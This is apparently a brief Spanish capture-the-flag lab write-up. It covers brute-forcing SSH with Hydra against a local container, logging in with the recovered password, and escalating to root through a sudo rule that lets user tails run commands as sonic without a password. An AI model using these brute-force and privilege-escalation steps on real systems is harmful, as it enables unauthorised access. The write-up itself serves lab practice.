## Reconocimiento:

Puerto 22 ; SSH

Puerto 80 : HTTP

En la web tenemos como dato útil “tails”

```bash
hydra -l tails -P WORDLIST ssh://172.17.0.2 -t 64 -I
```

Pass = 3117548331

```bash
ssh tails@172.17.0.2
```

## Escalad Tails → root

```bash
sudo -l
(sonic) NOPASSWD: ALL
```

Tails puede ejcutar cualquier comando como sonic sin contraseña:

```bash
sudo -u sonic sudo /bin/bash
```

Y listo.
